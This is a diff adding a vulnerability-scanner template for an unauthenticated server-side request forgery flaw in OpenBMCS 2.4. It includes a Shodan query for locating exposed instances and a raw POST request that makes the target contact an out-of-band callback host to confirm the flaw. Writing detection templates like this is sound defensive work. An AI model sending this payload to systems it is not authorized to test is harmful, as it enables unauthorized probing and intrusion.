@@ -1,0 +1,40 @@
+id: openbmcs-ssrf
+
+info:
+  name: OpenBMCS 2.4 - Server-Side Request Forgery /  Remote File Inclusion
+  author: dhiyaneshDK
+  severity: medium
+  description: OpenBMCS 2.4 is susceptible to unauthenticated server-side request forgery and remote file inclusion vulnerabilities within its functionalities. The application parses user supplied data in the POST parameter 'ip' to query a server IP on port 81 by default. Since no validation is carried out on the parameter, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host.
+  reference:
+    - https://www.exploit-db.com/exploits/50670
+    - https://securityforeveryone.com/tools/openbmcs-unauth-ssrf-rfi-vulnerability-scanner
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 6.8
+    cwe-id: CWE-918
+  metadata:
+    max-request: 1
+    shodan-query: http.favicon.hash:1550906681
+  tags: ssrf,oast,openbmcs,edb,misconfig
+
+http:
+  - raw:
+      - |
+        POST /php/query.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        ip={{interactsh-url}}:80&argu=/
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "http"
+
+      - type: status
+        status:
+          - 302
+
+# digest: 4a0a00473045022100d16aff0d228e68a1485794929aa88d53d923ce9378f15e7b2fbd697d71ad7d8f02206a1ababde1fe4eb58f8a87979a6610f04427085510b630bb842c0fa7f2b086e2:922c64590222798bb761d5b6d8e72950
